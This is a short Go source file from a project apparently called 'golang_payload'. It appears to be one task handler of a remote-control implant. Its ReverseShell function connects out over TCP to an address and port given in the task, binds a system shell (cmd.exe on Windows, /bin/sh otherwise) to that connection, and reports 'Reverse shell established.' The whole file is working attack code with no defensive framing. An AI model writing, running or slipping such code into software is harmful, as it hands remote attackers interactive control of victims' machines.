package actions

import (
	"golang_payload/types"
	"golang_payload/utils"
	"net"
	"os/exec"
	"runtime"
	"strconv"
)

func ReverseShell(task types.Task) {
	address := task.Args["address"].(string)
	port := strconv.Itoa(int(task.Args["port"].(float64)))

	conn, err := net.Dial("tcp", address+":"+port)

	if err != nil {
		utils.Finish(task, "Could not connect to "+address+":"+port, false)
		return
	}

	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd.exe")
	} else {
		cmd = exec.Command("/bin/sh")
	}

	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	go cmd.Run()

	utils.Finish(task, "Reverse shell established.", true)
}
